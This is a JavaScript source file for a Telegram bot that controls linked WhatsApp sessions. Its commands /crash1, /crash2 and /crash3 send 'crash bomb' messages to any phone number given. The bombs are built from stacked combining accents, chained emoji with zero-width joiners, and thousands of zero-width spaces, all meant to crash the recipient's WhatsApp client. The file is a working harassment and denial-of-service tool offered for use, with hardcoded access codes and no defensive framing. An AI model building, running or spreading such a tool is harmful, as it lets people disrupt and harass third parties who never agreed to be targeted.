require('dotenv').config();
const { Telegraf } = require('telegraf');
const {
    makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
} = require('@whiskeysockets/baileys');
const P = require('pino');
const fs = require('fs');
const path = require('path');

const TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = parseInt(process.env.OWNER_ID || '7208963440');
const VALID_CODES = ['yelladev', 'crypticq'];

if (!TOKEN) { console.error('BOT_TOKEN missing'); process.exit(1); }

const bot = new Telegraf(TOKEN);
const authorizedUsers = new Set([OWNER_ID]); // owner always authorised
const sessions = new Map();
const SESSIONS_DIR = path.join(__dirname, 'sessions');
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR);

// ========== WhatsApp session manager ==========
async function createSession(sessionId) {
    const authFolder = path.join(SESSIONS_DIR, sessionId);
    const { state, saveCreds } = await useMultiFileAuthState(authFolder);
    const { version } = await fetchLatestBaileysVersion();
    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, P({ level: 'silent' })),
        },
        logger: P({ level: 'silent' }),
    });
    sock.ev.on('creds.update', saveCreds);
    sock.ev.on('connection.update', ({ connection }) => {
        if (connection === 'open') {
            sessions.set(sessionId, { ...sessions.get(sessionId), sock, ready: true });
            console.log(`Session ${sessionId} ready`);
        } else if (connection === 'close') {
            sessions.delete(sessionId);
        }
    });
    return sock;
}

// Load all saved sessions on start
async function loadAllSessions() {
    const dirs = fs.readdirSync(SESSIONS_DIR, { withFileTypes: true }).filter(d => d.isDirectory()).map(d => d.name);
    for (const d of dirs) {
        try {
            await createSession(d);
        } catch (e) {
            console.error(`Failed to load ${d}:`, e.message);
        }
    }
}

// ========== Helper to get first ready session ==========
function getReadySession() {
    for (const [id, v] of sessions) {
        if (v.ready) return { id, sock: v.sock };
    }
    return null;
}

// ========== Telegram commands (all need authorisation) ==========
bot.start((ctx) => ctx.reply('🔐 Send access code: *yelladev* or *crypticq*', { parse_mode: 'Markdown' }));

// Authorisation check
bot.use(async (ctx, next) => {
    const userId = ctx.from?.id;
    if (!userId) return;
    if (authorizedUsers.has(userId)) return next();
    const text = ctx.message?.text?.trim() || '';
    if (VALID_CODES.includes(text.toLowerCase())) {
        authorizedUsers.add(userId);
        ctx.reply('✅ Access granted. Use /pair, /crash1, /crash2, /crash3');
        return;
    }
    if (text && !text.startsWith('/')) return; // ignore non-commands before auth
    return ctx.reply('❌ Unauthorised. Send one of the codes.');
});

// /pair – link a WhatsApp number
bot.command('pair', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Usage: /pair 2637XXXXXXXX');
    const phone = args[1].replace(/[^0-9]/g, '');
    const sessionId = `wa_${phone}`;
    try {
        const sock = await createSession(sessionId);
        if (!sock.authState.creds.registered) {
            const code = await sock.requestPairingCode(phone);
            sessions.set(sessionId, { sock, ready: false, phone });
            ctx.reply(`🔑 Pairing code: \`${code}\`\nOpen WhatsApp on *+${phone}* → Linked Devices → Link a Device → enter code.`, { parse_mode: 'Markdown' });
        } else {
            ctx.reply('That number is already linked.');
        }
    } catch (e) {
        ctx.reply('Error: ' + e.message);
    }
});

// /crash1 – Accent stacker (strongest)
bot.command('crash1', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Usage: /crash1 2637XXXXXXXX');
    const target = args[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    const bomb = 'A' + '\u0301'.repeat(200);
    await sendCrash(ctx, target, bomb, 'Accent Stacker');
});

// /crash2 – Emoji chain bomb
bot.command('crash2', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Usage: /crash2 2637XXXXXXXX');
    const target = args[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    const bomb = Array(50).fill('👋🏻\u200D🏽\uFE0F').join('');
    await sendCrash(ctx, target, bomb, 'Emoji Chain');
});

// /crash3 – Invisible zero-width bomb
bot.command('crash3', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Usage: /crash3 2637XXXXXXXX');
    const target = args[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    const bomb = '\u200B'.repeat(2000);
    await sendCrash(ctx, target, bomb, 'Invisible Zero‑Width');
});

// /status – list sessions
bot.command('status', (ctx) => {
    const list = Array.from(sessions.entries()).map(([id, v]) => `${v.phone || id}: ${v.ready ? '✅' : '⏳'}`).join('\n') || 'No sessions.';
    ctx.reply('📊 Sessions:\n' + list);
});

// ========== Crash sender ==========
async function sendCrash(ctx, targetJid, bombText, type) {
    const session = getReadySession();
    if (!session) return ctx.reply('❌ No WhatsApp session online. Pair a number first with /pair.');
    try {
        await session.sock.sendMessage(targetJid, { text: bombText });
        ctx.reply(`💣 ${type} sent to ${targetJid.split('@')[0]}!`);
    } catch (e) {
        ctx.reply('Send failed: ' + e.message);
    }
}

bot.catch((err, ctx) => {
    console.error('Bot error:', err);
    ctx.reply('An error occurred.');
});

// ========== Start ==========
(async () => {
    await loadAllSessions();
    console.log('Sessions loaded. Launching bot...');
    bot.launch();
    console.log('Cryptic_Queen V1 is running.');
})();
